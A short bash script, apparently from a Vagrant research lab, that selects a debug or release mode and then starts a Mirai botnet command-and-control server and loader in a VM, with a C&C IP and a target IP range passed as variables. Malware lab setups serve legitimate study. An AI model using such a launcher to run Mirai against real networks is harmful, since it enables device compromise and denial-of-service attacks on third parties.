#!/usr/bin/env bash
base_dir=$(dirname "$0")
if [ $# != 1 ]; then
    echo "!> Missing build type." 
    echo "!> Usage: $0 <debug | release>"
    exit
fi

if [ "$1" == "release" ]; then

	echo "Release Mode"

elif [ "$1" == "debug" ]; then

	echo "Debug Mode"

else
    echo "Unknown parameter $1: $0"
fi

echo "Starting mirai cnc and loader..."

echo "cd $base_dir"
      cd $base_dir

echo "ni=\"$ni\" ip_prx=\"$ip_prx\" cnc_ip=\"$cnc_ip\" tgt_bgn=\"$tgt_bgn\" tgt_end=\"$tgt_end\" vagrant ssh mirai -c \"sudo /vagrant/configs/start.sh $1\""
      ni="$ni"   ip_prx="$ip_prx"   cnc_ip="$cnc_ip"   tgt_bgn="$tgt_bgn"   tgt_end="$tgt_end"   vagrant ssh mirai -c "sudo /vagrant/configs/start.sh $1"
